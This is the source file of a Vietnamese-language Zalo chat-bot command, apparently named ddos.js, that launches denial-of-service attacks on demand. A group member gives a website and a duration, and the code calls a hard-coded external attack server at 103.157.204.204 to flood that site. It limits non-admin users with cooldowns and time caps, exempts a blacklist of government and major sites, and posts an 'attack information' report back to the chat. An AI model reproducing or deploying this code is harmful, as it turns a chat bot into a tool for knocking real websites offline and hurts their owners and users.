import { getGlobalPrefix } from '../service.js';
import { sendMessageStateQuote } from '../chat-zalo/chat-style/chat-style.js';
import { nameServer } from '../../database/index.js';
import { getUserInfoData } from '../info-service/user-info.js';
import { existsSync, readFileSync } from 'fs';
import { getBotInfo } from '../../utils/env.js';
import { removeMention } from '../../utils/format-util.js';

// === CẤU HÌNH ADMIN TỪ FILE (ĐỘNG) ===
const botInfo = await getBotInfo();
const adminFilePath = botInfo.adminFilePath;

let cachedAdmins = null;
let lastReadTime = 0;
const CACHE_TTL = 30_000; // 30 giây

async function getHighLevelAdmins() {
  const now = Date.now();
  if (cachedAdmins && now - lastReadTime < CACHE_TTL) {
    return cachedAdmins;
  }

  try {
    if (existsSync(adminFilePath)) {
      const data = readFileSync(adminFilePath, 'utf8');
      cachedAdmins = JSON.parse(data);
      lastReadTime = now;
      return cachedAdmins;
    }
  } catch (error) {
    console.error('[getHighLevelAdmins] Lỗi đọc file:', error.message);
  }

  cachedAdmins = [];
  return [];
}

// === CẤU HÌNH LỆNH CLF ===
const lastCalledTimesClf = {};
const MAX_USER_TIME_CLF = 120; // giây
const COOLDOWN_SECONDS_CLF = 300; // 5 phút

const BLACKLIST_DOMAINS_CLF = [
  'gov','gov.vn','chinhphu.vn','chinhphu','mps.gov.vn','moj.gov.vn','moha.gov.vn','moh',
  'gdt.gov.vn','bocongan.gov.vn','congan.gov.vn','mps','thue','fbi','cia',
  'facebook.com','youtube.com','edu','edu.vn'
];

// === HÀM HỖ TRỢ ===
const getCleanNameServerClf = () => {
  const raw = nameServer || '';
  const lines = raw
    .split('\n')
    .map(line => line.trim())
    .filter(line => line);

  const tagLine = lines.find(line => line.startsWith('@'));
  const boldLine = lines.find(line => /\*\*(.*?)\*\*/.test(line) || /__(.*?)__/.test(line));

  return [tagLine, boldLine].filter(Boolean).join(' ') + (tagLine || boldLine ? ' ' : '');
};

async function isAdminClf(uid, api) {
  try {
    const highLevelAdmins = await getHighLevelAdmins();
    if (highLevelAdmins.includes(String(uid))) return true;

    if (!api || typeof api.getUserInfo !== 'function') return false;
    const info = await api.getUserInfo(uid).catch(() => null);
    if (!info) return false;
    return info?.role === 'admin' || info?.isAdmin === true || info?.is_admin === true;
  } catch {
    return false;
  }
}

function isBlacklistedUrlClf(inputUrl) {
  try {
    const parsed = new URL(inputUrl.includes('://') ? inputUrl : `http://${inputUrl}`);
    const host = parsed.hostname.toLowerCase().replace(/^www\./, '');
    return BLACKLIST_DOMAINS_CLF.some(b => {
      const bb = b.toLowerCase();
      return host === bb || host.endsWith(`.${bb}`) || host.includes(`${bb}.`);
    });
  } catch {
    return false;
  }
}

// === XỬ LÝ LỆNH CLF VỚI ALIAS ĐỘNG ===
export async function handleClfCommand(api, message, aliasCommand) {
  const threadId = message?.threadId;
  const uid = message?.data?.uidFrom;
  let content = removeMention(message);
  const currentPrefix = (await getGlobalPrefix()) || '';
  const serverName = getCleanNameServerClf();

  let isGroup = String(threadId) !== String(uid);
  if (typeof message?.isGroup !== 'undefined') {
    isGroup = message.isGroup;
  }

  if (!content || !uid) return;

  const fullCommand = `${currentPrefix}${aliasCommand}`;
  if (!content.startsWith(fullCommand)) return;

  const args = content.slice(fullCommand.length).trim();
  const parts = args.split(/\s+/);
  if (parts.length < 2) {
    return sendMessageStateQuote(
      api, message,
      `${serverName}Định dạng sai! Dùng: ${fullCommand} <url> <time>`,
      true, 60000, isGroup
    );
  }

  const url = parts[0].trim();
  let duration = parseInt(parts[1].trim(), 10);
  if (isNaN(duration) || duration <= 0) {
    return sendMessageStateQuote(
      api, message,
      `${serverName}Thời gian phải là số dương!`,
      true, 60000, isGroup
    );
  }

  if (isBlacklistedUrlClf(url)) {
    return sendMessageStateQuote(
      api, message,
      `${serverName}Website này nằm trong danh sách cấm (chính phủ / tổ chức nhạy cảm). Vui lòng thử URL khác.`,
      true, 60000, isGroup
    );
  }

  const userIsAdmin = await isAdminClf(uid, api);

  if (!userIsAdmin && duration > MAX_USER_TIME_CLF) {
    duration = MAX_USER_TIME_CLF;
  }

  const now = Math.floor(Date.now() / 1000);
  if (!userIsAdmin) {
    const lastCalled = lastCalledTimesClf[uid] || 0;
    if (now - lastCalled < COOLDOWN_SECONDS_CLF) {
      const remaining = COOLDOWN_SECONDS_CLF - (now - lastCalled);
      const minutes = Math.floor(remaining / 60);
      const seconds = remaining % 60;
      return sendMessageStateQuote(
        api, message,
        `${serverName}Bạn cần đợi ${minutes} phút ${seconds} giây nữa để dùng lại lệnh này.`,
        true, 60000, isGroup
      );
    }
    lastCalledTimesClf[uid] = now;
  }

  // === GỌI API TẤN CÔNG (ĐÃ SỬA LỖI ABORTED) ===
  const apiUrl = `http://103.157.204.204:8000/attack?web=${encodeURIComponent(url)}&thoigian=${duration}`;
  let attackSuccess = false;
  let errorReason = '';

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000); // TĂNG LÊN 15 GIÂY

    try {
      const response = await fetch(apiUrl, {
        signal: controller.signal,
        headers: {
          'User-Agent': 'Mozilla/5.0 (ZaloBot/1.0)',
          'Accept': 'application/json'
        }
      });

      clearTimeout(timeoutId);

      if (response.ok) {
        attackSuccess = true;
      } else {
        const text = await response.text();
        errorReason = `HTTP ${response.status}: ${text.substring(0, 100)}`;
        console.warn('API trả lỗi:', errorReason);
      }
    } catch (err) {
      clearTimeout(timeoutId);
      if (err.name === 'AbortError') {
        errorReason = 'Timeout sau 15 giây (server chậm)';
      } else if (err.message.includes('network')) {
        errorReason = 'Mất kết nối mạng';
      } else {
        errorReason = err.message;
      }
      console.warn('API call failed:', errorReason);
    }
  } catch (err) {
    errorReason = 'Lỗi không xác định';
    console.error('Lỗi nghiêm trọng:', err);
  }

  // === LẤY TÊN + UID NGƯỜI DÙNG LỆNH ===
  let name = `UID: ${uid}`;
  try {
    const userInfo = await getUserInfoData(api, uid);
    if (userInfo?.name) name = userInfo.name;
  } catch (err) {
    console.error('[ddos.js] Lỗi lấy tên:', err);
  }

  const timeStr = new Date(now * 1000).toLocaleString('vi-VN', {
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    day: '2-digit', month: '2-digit', year: 'numeric'
  });

  const statusText = attackSuccess
    ? 'CLF Started'
    : `Gửi thất bại: ${errorReason}`;

  const responseMessage =
    `Thông tin tấn công\n\n` +
    `Thông tin người gọi:\n` +
    `  Tên: ${name}\n` +
    `  UID: ${uid}\n\n` +
    `Chi tiết tấn công:\n` +
    `  Website: ${url}\n` +
    `  Thời gian: ${duration} Giây\n` +
    `  Thời gian tối đa: ${userIsAdmin ? 'Không giới hạn (admin)' : `${MAX_USER_TIME_CLF} Giây`}\n` +
    `  Phương thức: clf\n` +
    `  Thời gian bắt đầu: ${timeStr}\n` +
    `  PID: ${now}\n\n`;

  await sendMessageStateQuote(api, message, `${serverName}${responseMessage}`, true, 180000, isGroup);
}